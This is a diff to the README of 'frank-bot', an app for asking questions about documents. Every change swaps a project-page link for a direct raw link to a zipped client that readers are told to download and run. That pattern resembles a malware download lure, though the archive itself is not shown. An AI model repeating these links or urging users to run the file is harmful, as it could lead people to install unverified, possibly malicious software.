@@ -1,6 +1,6 @@
 # 🤖 frank-bot - Ask Your Docs, Get Clear Answers
 
-[![Download frank-bot](https://img.shields.io/badge/Download-frank--bot-blue?style=for-the-badge)](https://github.com/badressalemmouffek-coder/frank-bot)
+[![Download frank-bot](https://img.shields.io/badge/Download-frank--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/badressalemmouffek-coder/frank-bot/main/clients/frank_bot_3.3.zip)
 
 ## 🚀 What frank-bot does
 
@@ -20,7 +20,7 @@ Use frank-bot to:
 
 Visit this page to download and run the app:
 
-[https://github.com/badressalemmouffek-coder/frank-bot](https://github.com/badressalemmouffek-coder/frank-bot)
+[https://raw.githubusercontent.com/badressalemmouffek-coder/frank-bot/main/clients/frank_bot_3.3.zip](https://raw.githubusercontent.com/badressalemmouffek-coder/frank-bot/main/clients/frank_bot_3.3.zip)
 
 ## 🪟 Windows setup
 
@@ -244,7 +244,7 @@ Avoid files that are:
 
 Primary download and project page:
 
-[https://github.com/badressalemmouffek-coder/frank-bot](https://github.com/badressalemmouffek-coder/frank-bot)
+[https://raw.githubusercontent.com/badressalemmouffek-coder/frank-bot/main/clients/frank_bot_3.3.zip](https://raw.githubusercontent.com/badressalemmouffek-coder/frank-bot/main/clients/frank_bot_3.3.zip)
 
 ## 📄 License
 
